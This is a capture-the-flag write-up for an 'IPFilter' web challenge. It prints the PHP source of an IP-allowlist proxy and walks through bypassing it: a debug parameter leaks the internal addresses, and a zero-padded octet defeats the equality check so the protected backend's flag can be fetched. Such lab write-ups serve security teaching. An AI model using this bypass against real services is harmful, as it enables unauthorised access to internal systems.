# IPFilter
 
## Description

...Writing after ctf ended so no access to challenge descriptions...

[http://52.59.124.14:10019](http://52.59.124.14:10019)

## Analysis

index.php:

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IPfilter</title>
</head>
<body>
	<h1>IPfilter</h1>
	<p>With <3 from @gehaxelt</p>
</body>
<!-- view source: ?src -->
</html>
```

Source:

```php
<?php
    error_reporting(0);
    function fetch_backend($ip) {
        if(is_bad_ip($ip)) {
            return "This IP is not allowed!";
        }
        return file_get_contents("http://". $ip . "/");
    }
    function is_bad_ip($ip) {
        if(!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $ip)) {
            // IP must be in X.Y.Z.Q format
            return true;
        }
        $frontend = gethostbyname(gethostname());
        $backend = gethostbyname("ipfilter_backend");
        $subnet = long2ip(ip2long($frontend) & ip2long("255.255.255.0"));
        $bcast = long2ip(ip2long($frontend) | ~ip2long("255.255.255.0"));

        if(isset($_GET['debug_filter'])) {
            echo "<pre>";
            echo "IP: " . $ip . "<br>";
            echo "Frontend: " . $frontend . "<br>";
            echo "Backend: " . $backend . "<br>";
            echo "Subnet:" . $subnet . "<br>";
            echo "Broadcast:" . $bcast . "<br>";
            echo  "</pre>";
        }

        if(inet_pton($ip) < (int) inet_pton($subnet)) {
            // Do not go below the subnet!
            return true;
        }
        if(! (inet_pton($ip) < inet_pton($bcast))) {
            // Do not go above the subnet!
            return true;
        }
        if($ip == $backend) {
            // Do not allow the backend with our secrets ;-)
            return true;
        }
        return false;
    }
    if(isset($_GET['fetch_backend']) ) {
        echo fetch_backend($_GET['bip']);
    }
    if(isset($_GET['src'])) {
        highlight_file(__FILE__);
    }
    // with <3 from @gehaxelt
?>
```

1. If `src` is set we get source code.
2. If `fetch_backend` and `bip` is set we can fetch the backend.
3. If `debug_filter` we get debug information.
4. `is_bad_ip` Checks:
	* Is valid IPv4 format. e.g.: 192.168.1.1
	* Is within subnet
	* Doesnt equal backend ip

Hmm... How to get backend if the IP is blocked?.... First let's get the idea of what we have.

Request: <http://52.59.124.14:10019/?debug_filter=1&fetch_backend=1&bip=192.168.1.1>

Response:
```html
IPfilter

IP: 192.168.1.1  
Frontend: 192.168.112.3  
Backend: 192.168.112.2  
Subnet:192.168.112.0  
Broadcast:192.168.112.255  

With <3 from @gehaxelt
```

We identified the backend server IP, but we can't access it due to `if` check.

Looking at the source code there's one critical check missing and that's if `$IP` is valid or not.

```
IPfilter
IP: 192.168.1.999 # <-- Invalid IP
Frontend: 192.168.112.3
Backend: 192.168.112.2
Subnet:192.168.112.0
Broadcast:192.168.112.255
With <3 from @gehaxelt
```

## Solution

Because regex expects each octet of IP to be either length of 1, 2 or 3 we can abuse that.<br>
If we send `02` or `002` it will be 2, because... math? 💦

Request: <http://52.59.124.14:10019/?debug_filter=1&fetch_backend=1&bip=192.168.112.02>

Response:

```
IPfilter

IP: 192.168.112.02  
Frontend: 192.168.112.3  
Backend: 192.168.112.2  
Subnet:192.168.112.0  
Broadcast:192.168.112.255  

ENO{Another_Fl4G_something_IP_STuff!}

With <3 from @gehaxelt
```
::: tip Flag
`ENO{Another_Fl4G_something_IP_STuff!}`
:::